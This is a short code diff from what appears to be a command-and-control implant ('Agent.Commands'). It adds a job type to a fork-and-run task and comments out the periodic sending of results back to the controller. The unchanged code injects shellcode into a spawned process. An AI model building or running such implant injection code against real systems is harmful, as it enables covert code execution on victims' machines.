@@ -62,7 +62,7 @@ namespace Agent.Commands
                 if (creationParms.RedirectOutput)
                 {
                     var jobService = ServiceProvider.GetService<IJobService>();
-                    this.JobId = jobService.RegisterJob(procResult.ProcessId, task.GetParameter<string>(ParameterId.Name), task.Id).Id;
+                    this.JobId = jobService.RegisterJob(JobType.ForkAndRun,procResult.ProcessId, task.GetParameter<string>(ParameterId.Name), task.Id).Id;
                 }
 
                 APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode, 0, context.ConfigService.APIInjectionMethod);
@@ -78,12 +78,12 @@ namespace Agent.Commands
                         }
 
                         context.AppendResult(output, false);
-                        if (stopwatch.ElapsedMilliseconds > context.ConfigService.JobResultDelay)
-                        {
-                            context.Agent.SendTaskResult(context.Result).Wait();
-                            context.ClearResult();
-                            stopwatch.Restart();
-                        }
+                        //if (stopwatch.ElapsedMilliseconds > context.ConfigService.JobResultDelay)
+                        //{
+                        //    context.Agent.SendTaskResult(context.Result).Wait();
+                        //    context.ClearResult();
+                        //    stopwatch.Restart();
+                        //}
                     });
                 else
                     context.AppendResult($"Injection succeed.");
